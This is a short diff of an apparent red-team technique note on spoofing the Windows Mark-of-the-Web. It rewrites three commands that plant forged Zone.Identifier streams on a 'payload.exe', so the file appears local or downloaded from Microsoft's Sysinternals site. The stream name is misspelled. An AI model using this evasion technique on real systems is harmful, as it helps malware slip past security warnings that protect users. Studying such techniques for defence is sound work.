@@ -12,11 +12,11 @@ tags:
 # 03 - Spoof ZoneTransfer (MOTW Bypass)
 
 ```
-$ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/implant.exe:Zone.Identifer
+$ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/payload.exe:Zone.Identifer
 
-$ echo -e "[ZoneTransfer]\nZoneId=1" > /mnt/ntfs/implant.exe:Zone.Identifer
+$ echo -e "[ZoneTransfer]\nZoneId=1" > /mnt/ntfs/payload.exe:Zone.Identifer
 
-$ echo -e "[ZoneTransfer]\nZoneId=2\nReferrerUrl=https://learn.microsoft.com\nHostUrl=https://download.sysinternals.com/files/PsExec.exe" > /mnt/ntfs/implant.exe:Zone.Identifer
+$ echo -e "[ZoneTransfer]\nZoneId=2\nReferrerUrl=https://learn.microsoft.com\nHostUrl=https://download.sysinternals.com/files/PsExec.exe" > /mnt/ntfs/payload.exe:Zone.Identifer
 ```
 
 Unmount the container.
